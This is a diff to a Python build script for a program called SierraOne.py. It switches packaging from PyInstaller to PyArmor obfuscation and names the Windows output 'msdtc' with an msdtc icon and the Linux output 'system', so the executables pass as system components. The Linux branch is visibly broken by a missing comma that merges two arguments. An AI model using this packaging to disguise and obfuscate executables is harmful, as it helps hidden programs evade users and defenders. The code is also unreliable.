@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 from argparse import ArgumentParser
 from os import remove
 from shutil import rmtree
@@ -8,31 +10,31 @@ from time import sleep
 
 def remove_junk():
     rmtree("build")
-    rmtree("__pycache__")
 
 
 def builder(dist):
     if dist == "windows":
         run(["wine",
-             "pyinstaller",
-             "--onefile",
-             "--icon=media/msdtc.ico",
+             "pyarmor",
+             "pack",
+             "-e",
+             " --onefile --icon media/msdtc.ico",
              "-n",
-             "msdtc.exe",
+             "msdtc",
              "SierraOne.py"])
         sleep(1)
-        remove("msdtc.exe.spec")
         remove_junk()
         print("\nDone. Check 'dist' for your file")
 
     elif dist == "linux":
-        run(["pyinstaller",
+        run(["pyarmor",
+             "pack",
+             "-e"
              "--onefile",
              "-n",
              "system",
              "SierraOne.py"])
         sleep(1)
-        remove("system.spec")
         remove_junk()
         print("\nDone. Check 'dist' for your file")
 
